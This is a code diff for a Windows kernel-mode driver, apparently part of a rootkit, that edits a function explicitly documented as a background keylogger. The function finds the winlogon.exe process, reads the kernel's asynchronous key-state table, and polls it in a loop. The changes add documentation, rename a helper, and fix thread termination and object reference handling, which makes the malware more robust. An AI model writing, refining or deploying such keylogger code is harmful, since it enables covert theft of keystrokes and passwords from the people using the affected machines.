@@ -91,9 +91,11 @@ BeGetGafAsyncKeyStateAddress(PEPROCESS targetProc)
 	return address;
 }
 
-// TODO: document
+/**
+ * Thread function that runs a keylogger in the background, directly reading from gafAsyncKeyStateAddress
+ */
 VOID
-BeKeyLoggerFunction(_In_ PVOID StartContext)
+BeKeyLoggerFunction(IN PVOID StartContext)
 {
 	UNREFERENCED_PARAMETER(StartContext);
 
@@ -103,11 +105,12 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
 	PEPROCESS targetProc = 0;
 	UNICODE_STRING processName;
 	RtlInitUnicodeString(&processName, L"winlogon.exe");
-	HANDLE procId = GetPidFromProcessName(processName); //  GetPidFromProcessName(processName);
+	HANDLE procId = BeGetPidFromProcessName(processName); 
 	LOG_MSG("Found winlogon PID: %i\n", procId);
 	if (PsLookupProcessByProcessId(procId, &targetProc) != 0)
 	{
 		ObDereferenceObject(targetProc);
+		PsTerminateSystemThread(STATUS_NOT_FOUND);
 		return;
 	}
 
@@ -130,7 +133,8 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
 		interval.QuadPart = -1 * (LONGLONG)100 * 10000; 
 		KeDelayExecutionThread(KernelMode, FALSE, &interval);
 	}
-	
+
+	ObDereferenceObject(targetProc);
 	PsTerminateSystemThread(STATUS_SUCCESS);
 }
  
